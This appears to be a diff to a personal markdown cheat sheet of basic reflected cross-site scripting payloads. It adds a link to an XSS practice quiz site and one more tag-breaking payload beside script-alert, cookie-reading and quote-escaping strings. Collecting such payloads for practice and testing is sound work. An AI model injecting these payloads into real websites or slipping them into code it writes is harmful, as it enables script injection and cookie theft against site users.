@@ -1,11 +1,16 @@
 # basic payload
 
+# try
+https://xss-quiz.int21h.jp/
+
+
 ### reflected:
 ```
 <h1>xss try</h1>
 <script>alert(1)</script>
 <script>alert(document.cookie)</script>
 '-alert(1)-'
+"><script>prompt(1)</script>
 
 ```
 ifty' ; alert() ;'test
